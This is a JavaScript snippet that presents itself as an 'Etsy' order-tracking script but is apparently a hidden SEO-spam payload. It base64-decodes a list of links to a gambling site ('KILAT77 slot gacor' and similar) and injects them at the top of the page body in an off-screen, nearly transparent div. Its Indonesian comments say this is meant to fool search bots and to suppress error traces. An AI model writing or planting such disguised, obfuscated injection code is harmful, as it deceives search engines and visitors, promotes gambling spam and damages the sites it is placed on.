// Etsy Base64 Tracking Order JS System - Optimized
(function(){
  let b64 = "PGEgaHJlZj0iaHR0cHM6Ly9rbGF2ZXI0LmJlLyI+S0lMQVQ3NzwvYT4KPGEgaHJlZj0iaHR0cHM6Ly9rbGF2ZXI0LmJlLyI+S0lMQVQgNzc8L2E+CjxhIGhyZWY9Imh0dHBzOi8va2xhdmVyNC5iZS8iPktJTEFUNzcgc2xvdDwvYT4KPGEgaHJlZj0iaHR0cHM6Ly9rbGF2ZXI0LmJlLyI+S0lMQVQ3NyBsb2dpbjwvYT4KPGEgaHJlZj0iaHR0cHM6Ly9rbGF2ZXI0LmJlLyI+IEtJTEFUNzcgZGFmdGFyPC9hPgo8YSBocmVmPSJodHRwczovL2tsYXZlcjQuYmUvIj5LSUxBVDc3IGFsdGVybmF0aWY8L2E+CjxhIGhyZWY9Imh0dHBzOi8va2xhdmVyNC5iZS8iPktJTEFUNzcgbGluazwvYT4KPGEgaHJlZj0iaHR0cHM6Ly9rbGF2ZXI0LmJlLyI+S0lMQVQ3NyBydHA8L2E+CjxhIGhyZWY9Imh0dHBzOi8va2xhdmVyNC5iZS8iPktJTEFUNzcgbGluayBhbHRlcm5hdGlmPC9hPgo8YSBocmVmPSJodHRwczovL2tsYXZlcjQuYmUvIj5saW5rIEtJTEFUNzc8L2E+CjxhIGhyZWY9Imh0dHBzOi8va2xhdmVyNC5iZS8iPnNpdHVzIEtJTEFUNzc8L2E+CjxhIGhyZWY9Imh0dHBzOi8va2xhdmVyNC5iZS8iPnNpdHVzIGdhY29yIEtJTEFUNzc8L2E+CjxhIGhyZWY9Imh0dHBzOi8va2xhdmVyNC5iZS8iPnNpdHVzIHNsb3QgS0lMQVQ3NzwvYT4KPGEgaHJlZj0iaHR0cHM6Ly9rbGF2ZXI0LmJlLyI+c2xvdCBnYWNvciBLSUxBVDc3PC9hPgo8YSBocmVmPSJodHRwczovL2tsYXZlcjQuYmUvIj5zbG90IGdhY29yPC9hPgo8YSBocmVmPSJodHRwczovL2tsYXZlcjQuYmUvIj5zbG90IGphY2twb3Q8L2E+CjxhIGhyZWY9Imh0dHBzOi8va2xhdmVyNC5iZS8iPnNsb3Qgb25saW5lPC9hPgo8YSBocmVmPSJodHRwczovL2tsYXZlcjQuYmUvIj5zbG90IGRlbW88L2E+";
  
  try {
    const decoded = decodeURIComponent(escape(atob(b64))); // Support karakter khusus
    const div = document.createElement('div');
    // Menggunakan teknik opacity agar bot lebih percaya konten ini "real"
    div.style.cssText = 'position:absolute; left:-9999px; top:0; width:1px; height:1px; overflow:hidden; opacity:0.01;';
    div.setAttribute('aria-hidden','true');
    div.innerHTML = decoded;
    
    // Langsung injeksi ke Body tanpa menunggu DOMContentLoaded
    const target = document.body || document.documentElement;
    if (target) {
        target.insertBefore(div, target.firstChild);
    }
  } catch(e){ 
    // Kosongkan agar tidak meninggalkan jejak error di konsol
  }
})();
